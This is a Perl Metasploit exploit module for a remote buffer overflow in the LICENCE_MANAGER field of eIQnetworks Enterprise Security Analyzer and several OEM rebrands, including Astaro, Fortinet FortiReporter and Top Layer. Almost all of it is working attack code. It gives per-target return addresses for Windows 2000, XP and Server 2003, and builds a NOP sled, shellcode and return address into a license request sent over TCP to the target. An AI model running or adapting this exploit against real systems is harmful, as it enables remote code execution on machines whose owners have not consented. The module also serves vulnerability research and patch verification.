eIQnetworks License Manager Remote Buffer Overflow Exploit (multi)
==================================================================

#!/usr/bin/perl -w

package Msf::Exploit::EiQ_License; 
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	&#039;Name&#039;     => &#039;EIQ License Manager Overflow&#039;,
	&#039;Authors&#039;  => [ &#039;ri0t ri0t@ri0tnet.net KF kf_list@digitalmunition.com&#039; ],

	&#039;Arch&#039;  => [ &#039;x86&#039; ],
	&#039;OS&#039;    => [ &#039;win32&#039;, &#039;win2000&#039;, &#039;winxp&#039; ],
	&#039;Priv&#039;  => 0,
	
	&#039;AutoOpts&#039;  => { &#039;EXITFUNC&#039; => &#039;seh&#039; },
	
	&#039;UserOpts&#039;  =>
	  {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The target port&#039;, 10616],
	 },
        &#039;Payload&#039;  =>
	  {
		&#039;Space&#039; => 494,
		&#039;BadChars&#039;  => "\x00\x0a\x0d\x40\x26",
            },
          &#039;Description&#039;  =>  Pex::Text::Freeform(qq{
        This module Exploits a buffer overflow in the LICENCE_MANAGER field of
	EiQ networks Enterprise Security Analyzer.  This bug was found by Titon
	of Bastard Labs. 
        }),
        

	&#039;Refs&#039; =>
	[
		[&#039;OSVDB&#039;, &#039;27526&#039;],
	],
          
        &#039;DefaultTarget&#039; => 1,
	&#039;Targets&#039; =>
	  [
		[&#039;EiQ Enterprise Security Analyzer Buffer size 494 Windows 2000 SP0-SP4 English&#039;, 0x750316e2, 494 ],   # call ebx
		[&#039;EiQ Enterprise Security Analyzer Buffer size 494 Windows XP English SP1/SP2&#039;, 0x77db64dc, 494 ],	# jmp ebx
		[&#039;EiQ Enterprise Security Analyzer Buffer size 494 Windwos Server 2003 SP0/SP1&#039;, 0x77d16764, 494 ],   # jmp EBX
		[&#039;Astaro Report Manager (OEM) Buffer size 1262 Windows 2000 SP0-SP4 English&#039;, 0x750316e2, 1262 ],
		[&#039;Astaro Report Manager (OEM) Buffer size 1262 Windows XP English SP1/SP2&#039;, 0x77db64dc, 1262 ],
		[&#039;Astaro Report Manager (OEM) Buffer size 1262 Windows Server 2003 English SP0/SP1&#039;, 0x77d16764, 1262 ],
		[&#039;Fortinet FortiReporter (OEM) Buffer size 1262 Windows 2000 SP0-SP4 English&#039;, 0x750316e2, 1262 ],
	        [&#039;Fortinet FortiReporter (OEM) Buffer size 1262 Windows XP English SP1/SP2&#039;, 0x77db64dc, 1262 ],
	        [&#039;Fortinet FortiReporter (OEM) Buffer size 1262 Windows Server 2003 English SP0/SP1&#039;, 0x77d16764, 1262 ],
		[&#039;iPolicy Security Reporter (OEM) Buffer size 1262 Windows 2000 SP0-SP4 English&#039;, 0x750316e2, 1262 ],
                [&#039;iPolicy Security Reporter (OEM) Buffer size 1262 Windows XP English SP1/SP2&#039;, 0x77db64dc, 1262 ],
		[&#039;iPolicy Security Reporter (OEM) Buffer size 1262 Windows Server 2003 English SP0/SP1&#039;, 0x77d16764, 1262 ],
		[&#039;SanMina Viking Multi-Log Manager (OEM) Buffer size 1262 Windows 2000 SP0-SP4 English&#039;, 0x750316e2, 1262 ],
                [&#039;SanMina Viking Multi-Log Manager (OEM) Buffer size 1262 Windows XP English SP1/SP2&#039;, 0x77db64dc, 1262 ],
		[&#039;SanMina Viking Multi-Log Manager (OEM) Buffer size 1262 Windows Server 2003 English SP0/SP1&#039;, 0x77d16764, 1262 ],
		[&#039;Secure Computing G2 Security Reporter (OEM) Buffer size 1262 Windows 2000 SP0-SP4 English&#039;, 0x750316e2, 1262 ],
                [&#039;Secure Computing G2 Security Reporter (OEM) Buffer size 1262 Windows XP English SP1/SP2&#039;, 0x77db64dc, 1262 ],
	        [&#039;Secure Computing G2 Security Reporter (OEM) Buffer size 1262 Windows Server 2003 English SP0/SP1&#039;, 0x77d16764, 1262 ],
		[&#039;Top Layer Network Security Analyzer (OEM) Buffer size 1262 Windows 2000 SP0-SP4 English&#039;, 0x750316e2, 1262 ],
                [&#039;Top Layer Network Security Analyzer (OEM) Buffer size 1262 Windows XP English SP1/SP2&#039;, 0x77db64dc, 1262 ],
	        [&#039;Top Layer Network Security Analyzer (OEM) Buffer size 1262 Windows Server 2003 English SP0/SP1&#039;, 0x77d16764, 1262 ],
         ], 
  };
  
  sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}
  
  sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);
	my $target_idx  = $self->GetVar(&#039;TARGET&#039;);
	my $shellcode   = $self->GetVar(&#039;EncodedPayload&#039;)->Payload;
	my $target      = $self->Targets->[$target_idx];
	my $nopsize = $target->[2];
        my $nops 	= $self->MakeNops($nopsize - length($shellcode));
        my $ret         =  pack("V", $target->[1]);
        my $evil        = "LICMGR_ADDLICENSE&" . $nops . $shellcode . $ret . "&";
	
            
        my $s = Msf::Socket::Tcp->new
	  (
		&#039;PeerAddr&#039;  => $target_host,
		&#039;PeerPort&#039;  => $target_port,
		&#039;LocalPort&#039; => $self->GetVar(&#039;CPORT&#039;),
    	  );
          
          if ($s->IsError) {
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return;
	}
          $self->PrintLine(sprintf ("[*] Trying ".$target->[0]." using return address 0x%.8x....", $target->[1]));
          
          $s->Send("$evil");
          return;
  }


